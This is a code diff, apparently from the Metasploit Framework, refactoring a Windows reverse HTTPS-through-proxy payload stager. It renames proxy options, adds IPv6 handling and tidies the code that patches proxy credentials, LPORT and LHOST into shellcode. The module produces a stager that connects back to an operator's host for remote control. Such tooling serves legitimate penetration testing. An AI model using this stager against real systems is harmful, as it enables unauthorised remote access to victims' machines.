@@ -1,14 +1,14 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
-require 'msf/core'
 require 'msf/core/handler/reverse_https_proxy'
 
 
-module Metasploit3
+module MetasploitModule
+
+  CachedSize = 384
 
   include Msf::Payload::Stager
   include Msf::Payload::Windows
@@ -80,70 +80,74 @@ module Metasploit3
     p[i, u.length] = u
 
     # patch proxy info
-    proxyhost = datastore['PROXYHOST'].to_s
-    proxyport = datastore['PROXYPORT'].to_s || "8080"
+    proxyhost = datastore['HttpProxyHost'].to_s
+    proxyport = datastore['HttpProxyPort'].to_s || "8080"
+
+    if Rex::Socket.is_ipv6?(proxyhost)
+      proxyhost = "[#{proxyhost}]"
+    end
+
     proxyinfo = proxyhost + ":" + proxyport
     if proxyport == "80"
       proxyinfo = proxyhost
     end
-    if datastore['PROXY_TYPE'].to_s == 'HTTP'
+    if datastore['HttpProxyType'].to_s == 'HTTP'
       proxyinfo = 'http://' + proxyinfo
     else #socks
       proxyinfo = 'socks=' + proxyinfo
     end
+
     proxyloc = p.index("PROXYHOST:PORT")
     p = p.gsub("PROXYHOST:PORT",proxyinfo)
 
-    # patch the call
-    calloffset = proxyinfo.length
-    calloffset += 1
+    # Patch the call
+    calloffset = proxyinfo.length + 1
     p[proxyloc-4] = [calloffset].pack('V')[0]
 
-    #Optional authentification
-    if (datastore['PROXY_USERNAME'].nil? or datastore['PROXY_USERNAME'].empty?) or
-      (datastore['PROXY_PASSWORD'].nil? or datastore['PROXY_PASSWORD'].empty?) or
-      datastore['PROXY_TYPE'] == 'SOCKS'
+    # Authentication credentials have not been specified
+    if datastore['HttpProxyUser'].to_s == '' ||
+       datastore['HttpProxyPass'].to_s == '' ||
+       datastore['HttpProxyType'].to_s == 'SOCKS'
 
       jmp_offset = p.index("PROXY_AUTH_STOP") + 15 - p.index("PROXY_AUTH_START")
-      #remove auth code
+
+      # Remove the authentication code
       p = p.gsub(/PROXY_AUTH_START(.)*PROXY_AUTH_STOP/i, "")
     else
-      username_size_diff = 14 - datastore['PROXY_USERNAME'].length
-      password_size_diff = 14 - datastore['PROXY_PASSWORD'].length
-      jmp_offset = 16 + #PROXY_AUTH_START length
-          15 + #PROXY_AUTH_STOP length
-          username_size_diff + # difference between datastore PROXY_USERNAME length  and db "PROXY_USERNAME length"
-          password_size_diff   # same with PROXY_PASSWORD
-      #patch call offset
+      username_size_diff = 14 - datastore['HttpProxyUser'].to_s.length
+      password_size_diff = 14 - datastore['HttpProxyPass'].to_s.length
+      jmp_offset =
+        16 + # PROXY_AUTH_START length
+        15 + # PROXY_AUTH_STOP length
+        username_size_diff + # Difference between datastore HttpProxyUser length  and db "HttpProxyUser length"
+        password_size_diff   # Same with HttpProxyPass
+
+      # Patch call offset
       username_loc = p.index("PROXY_USERNAME")
       p[username_loc - 4, 4] = [15 - username_size_diff].pack("V")
       password_loc = p.index("PROXY_PASSWORD")
       p[password_loc - 4, 4] = [15 - password_size_diff].pack("V")
-      #remove markers & change login/pwd
+
+      # Remove markers & change login/password
       p = p.gsub("PROXY_AUTH_START","")
       p = p.gsub("PROXY_AUTH_STOP","")
-      p = p.gsub("PROXY_USERNAME", datastore['PROXY_USERNAME'])
-      p = p.gsub("PROXY_PASSWORD", datastore['PROXY_PASSWORD'])
+      p = p.gsub("PROXY_USERNAME", datastore['HttpProxyUser'].to_s)
+      p = p.gsub("PROXY_PASSWORD", datastore['HttpProxyPass'].to_s)
     end
-    #patch jmp dbl_get_server_host
+
+    # Patch jmp dbl_get_server_host
     jmphost_loc = p.index("\x68\x3a\x56\x79\xa7\xff\xd5") + 8 # push 0xA779563A        ; hash( "wininet.dll", "InternetOpenA" ) ; call ebp
     p[jmphost_loc, 4] = [p[jmphost_loc, 4].unpack("V")[0] - jmp_offset].pack("V")
-    #patch call Internetopen
+
+    # Patch call Internetopen
     p[p.length - 4, 4] = [p[p.length - 4, 4].unpack("V")[0] + jmp_offset].pack("V")
 
-    # patch the LPORT
-    lport = datastore['LPORT']
-
+    # Patch the LPORT
     lportloc = p.index("\x68\x5c\x11\x00\x00")  # PUSH DWORD 4444
-    p[lportloc+1] = [lport.to_i].pack('V')[0]
-    p[lportloc+2] = [lport.to_i].pack('V')[1]
-    p[lportloc+3] = [lport.to_i].pack('V')[2]
-    p[lportloc+4] = [lport.to_i].pack('V')[3]
+    p[lportloc+1,4] = [datastore['LPORT'].to_i].pack('V')
 
-    # append LHOST and return payload
-
-    lhost = datastore['LHOST']
-    p + lhost.to_s + "\x00"
+    # Append LHOST and return payload
+    p + datastore['LHOST'].to_s + "\x00"
 
   end
 
@@ -153,6 +157,5 @@ module Metasploit3
   def wfs_delay
     20
   end
-
 end
 
